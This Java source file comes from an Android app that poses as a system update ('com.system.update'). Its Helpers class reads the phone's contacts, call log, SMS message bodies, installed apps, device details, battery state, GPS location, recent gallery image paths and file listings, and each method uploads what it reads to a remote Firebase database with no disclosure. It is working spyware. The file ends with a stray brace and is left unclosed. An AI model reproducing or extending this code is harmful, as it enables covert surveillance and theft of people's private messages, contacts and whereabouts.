package com.system.update;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.location.Location;
import android.location.LocationManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Helpers {

    public static void pushContacts(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                Map<String, Object> m = new HashMap<>();
                m.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                m.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                list.add(m);
            }
            c.close();
        }
        ref.child("contacts").setValue(list);
    }

    public static void pushCalls(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");
        if (c != null) {
            int numI = c.getColumnIndex(CallLog.Calls.NUMBER);
            int nameI = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeI = c.getColumnIndex(CallLog.Calls.TYPE);
            int dateI = c.getColumnIndex(CallLog.Calls.DATE);
            int durI = c.getColumnIndex(CallLog.Calls.DURATION);
            int n = 0;
            while (c.moveToNext() && n < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("number", c.getString(numI));
                m.put("name", c.getString(nameI));
                m.put("type", callType(c.getInt(typeI)));
                m.put("date", c.getLong(dateI));
                m.put("duration", c.getInt(durI));
                list.add(m);
                n++;
            }
            c.close();
        }
        ref.child("calls").setValue(list);
    }

    private static String callType(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
            default: return "UNKNOWN";
        }
    }

    public static void pushSms(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
        if (c != null) {
            int aI = c.getColumnIndex("address");
            int bI = c.getColumnIndex("body");
            int dI = c.getColumnIndex("date");
            int tI = c.getColumnIndex("type");
            int n = 0;
            while (c.moveToNext() && n < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("address", c.getString(aI));
                m.put("body", c.getString(bI));
                m.put("date", c.getLong(dI));
                m.put("type", smsType(c.getInt(tI)));
                list.add(m);
                n++;
            }
            c.close();
        }
        ref.child("sms").setValue(list);
    }

    private static String smsType(int t) {
        switch (t) {
            case 1: return "INBOX";
            case 2: return "SENT";
            case 3: return "DRAFT";
            case 4: return "OUTBOX";
            default: return "UNKNOWN";
        }
    }

    public static void pushApps(Context ctx, DatabaseReference ref) {
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        List<Map<String, Object>> list = new ArrayList<>();
        for (ApplicationInfo a : apps) {
            Map<String, Object> m = new HashMap<>();
            m.put("appName", pm.getApplicationLabel(a).toString());
            m.put("packageName", a.packageName);
            try { m.put("versionName", pm.getPackageInfo(a.packageName, 0).versionName); }
            catch (Exception e) { m.put("versionName", "?"); }
            list.add(m);
        }
        ref.child("apps").setValue(list);
    }

    public static void pushSystem(Context ctx, DatabaseReference ref) {
        Map<String, Object> info = new HashMap<>();
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo mem = new ActivityManager.MemoryInfo();
        am.getMemoryInfo(mem);
        info.put("ramTotal", human(mem.totalMem));
        info.put("ramAvailable", human(mem.availMem));

        StatFs s = new StatFs(Environment.getDataDirectory().getPath());
        long total = s.getBlockSizeLong() * s.getBlockCountLong();
        long avail = s.getBlockSizeLong() * s.getAvailableBlocksLong();
        info.put("storageTotal", human(total));
        info.put("storageAvailable", human(avail));

        info.put("bootloader", Build.BOOTLOADER);
        info.put("host", Build.HOST);
        info.put("time", Build.TIME);
        info.put("model", Build.MODEL);
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("androidVersion", Build.VERSION.RELEASE);

        ref.child("systemInfo").setValue(info);
    }

    private static String human(long b) {
        if (b < 1024) return b + " B";
        double kb = b / 1024.0;
        if (kb < 1024) return String.format("%.1f KB", kb);
        double mb = kb / 1024.0;
        if (mb < 1024) return String.format("%.1f MB", mb);
        return String.format("%.2f GB", mb / 1024.0);
    }

    public static void pushBattery(Context ctx, DatabaseReference ref) {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent bs = ctx.registerReceiver(null, ifilter);
            if (bs == null) { ref.child("battery").setValue("unknown"); return; }
            int level = bs.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = bs.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int pct = (int) ((level / (float) scale) * 100);
            int status = bs.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            Map<String, Object> m = new HashMap<>();
            m.put("percent", pct);
            m.put("status", status);
            m.put("timestamp", System.currentTimeMillis());
            ref.child("battery").setValue(m);
        } catch (Exception e) {
            ref.child("battery").setValue("error: " + e.getMessage());
        }
    }

    public static void pushLocation(Context ctx, DatabaseReference ref) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = null;
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location lastGps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                Location lastNet = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                loc = lastGps != null ? lastGps : lastNet;
            }
            if (loc != null) {
                Map<String, Object> m = new HashMap<>();
                m.put("lat", loc.getLatitude());
                m.put("lng", loc.getLongitude());
                m.put("accuracy", loc.getAccuracy());
                m.put("timestamp", loc.getTime());
                ref.child("location").setValue(m);
            } else {
                ref.child("location").setValue("unavailable");
            }
        } catch (Exception e) {
            ref.child("location").setValue("error: " + e.getMessage());
        }
    }

    public static void pushGallery(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            Cursor c = ctx.getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (c != null) {
                int pathI = c.getColumnIndex(MediaStore.Images.Media.DATA);
                int dateI = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
                int sizeI = c.getColumnIndex(MediaStore.Images.Media.SIZE);
                int n = 0;
                while (c.moveToNext() && n < 100) {
                    Map<String, Object> m = new HashMap<>();
                    m.put("path", c.getString(pathI));
                    m.put("date", c.getLong(dateI));
                    m.put("size", c.getLong(sizeI));
                    list.add(m);
                    n++;
                }
                c.close();
            }
            ref.child("gallery").setValue(list);
        } catch (Exception e) {
            ref.child("gallery").setValue("error: " + e.getMessage());
        }
    }

    public static void pushFiles(Context ctx, DatabaseReference ref) {
        List<Map<String, Object>> list = new ArrayList<>();
        try {
            File[] dirs = {
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
            };
            for (File dir : dirs) {
                if (dir != null && dir.exists()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (list.size() >= 200) break;
                            Map<String, Object> m = new HashMap<>();
                            m.put("name", f.getName());
                            m.put("path", f.getAbsolutePath());
                            m.put("size", f.length());
                            m.put("isDir", f.isDirectory());
                            m.put("modified", f.lastModified());
                            list.add(m);
                        }
                    }
                }
            }
            ref.child("files").setValue(list);
        } catch (Exception e) {
            ref.child("files").setValue("error: " + e.getMessage());
        }
    }
                    }
